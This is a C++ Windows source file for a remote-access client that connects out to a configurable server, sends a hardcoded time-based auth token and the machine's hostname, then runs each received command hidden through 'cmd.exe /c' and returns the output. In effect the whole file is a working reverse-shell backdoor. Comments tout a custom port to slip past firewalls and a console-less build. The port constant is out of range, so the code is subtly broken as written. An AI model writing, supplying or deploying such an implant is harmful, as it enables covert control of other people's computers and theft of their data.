#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>

#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"

// Set this to your server IP
#define SERVER_IP "IP_PLACEHOLDER"
#define PORT 10293847576

void active_ansi()
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    if (!SetConsoleMode(hOut, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING))
        printf("ANSI not supported\n");
}

// execute a command, capture output, and send it back to the server
static void exec_cmd_and_send(SOCKET sock, char *cmd)
{
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char buffer[1024];
    DWORD bytesRead;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        printf(RED "[-] Failed to create pipe\n" RESET);
        return;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    ZeroMemory(&pi, sizeof(pi));

    std::string command = "cmd.exe /c ";
    command += cmd;

    printf(YELLOW "[*] Executing command: %s\n" RESET, cmd);

    if (!CreateProcess(
        NULL,
        (LPSTR)command.c_str(),
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        printf(RED "[-] Failed to create process\n" RESET);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }

    CloseHandle(hWrite);

    // read command output and send it back to server
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';
        send(sock, buffer, bytesRead, 0);
    }

    // indicate end of command output
    send(sock, "[END]\n", 6, 0);

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf(GREEN "[+] Command executed and output sent\n" RESET);
}

// send the local hostname to the server
static void send_hostname(SOCKET sock)
{
    char hostname[256];

    if (gethostname(hostname, sizeof(hostname)) == 0)
    {
        char msg[300];
        snprintf(msg, sizeof(msg), "[HOST]%s\n", hostname);
        Sleep(1000);
        send(sock, msg, strlen(msg), 0);
        printf(GREEN "[+] Hostname sent: %s\n" RESET, hostname);
    }
    else
        printf(RED "[-] Failed to get hostname\n" RESET);
}

// generate time-based authentication password
std::string get_password()
{
    std::string password = "dF8#kL2@xQ9!pW7zT4$eR6uM1&bY";
    password += std::to_string(time(NULL) / 30);
    return password;
}

// send authentication token to the server
static void send_pass(SOCKET sock, std::string password)
{
    std::string pass = "[AUTH]" + password + "\n";
    Sleep(1000);
    send(sock, pass.c_str(), pass.size(), 0);
    printf(GREEN "[+] Auth token sent\n" RESET);
}

// taskkill /IM client_no_console.exe /F

int main()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
    active_ansi();

    // choose Winsock version
    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested,&wsaData);
    if (err != 0)
    {
        printf(RED "[-] WSAStartup failed\n" RESET);
        return (0);
    }
    printf(GREEN "[+] Winsock initialized\n" RESET);
    
    int af = AF_INET; // IPv4
    int type = SOCK_STREAM; // TCP
    int protocol = 0; // auto (will use TCP)
    SOCKET sock;

    sock = socket(af, type, protocol);
    if (sock == INVALID_SOCKET)
    {
        printf(RED "[-] socket failed\n" RESET);
        return (1);
    }
    printf(GREEN "[+] Socket created\n" RESET);

    struct sockaddr_in saServer;
    saServer.sin_family = AF_INET;
    saServer.sin_addr.s_addr = inet_addr(SERVER_IP);
    saServer.sin_port = htons((int)PORT); // custom port (can help bypass some firewalls)

    // attempt connection to server
    printf(YELLOW "[*] Connecting to %s:%d...\n" RESET, SERVER_IP, (int)PORT);

    if (connect(sock, (struct sockaddr*)&saServer, sizeof(saServer)) == SOCKET_ERROR)
    {
        printf(RED "[-] Connection failed\n" RESET);
        Sleep(1000);
        return (1);
    }

    printf(GREEN "[+] Connected to server\n" RESET);

    // send authentication and hostname
    send_pass(sock, get_password());
    send_hostname(sock);

    printf(GREEN "[+] Ready to receive commands\n" RESET);

    char buffer[1024];

    while (true)
    {
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (bytes <= 0)
        {
            printf(RED "[-] Connection lost or recv failed\n" RESET);
            break;
        }

        buffer[bytes] = '\0';
        printf(YELLOW "[*] Command received: %s\n" RESET, buffer);

        exec_cmd_and_send(sock, buffer);
    }

    printf(YELLOW "[*] Closing connection\n" RESET);

    closesocket(sock);
    WSACleanup();
    return (0);
}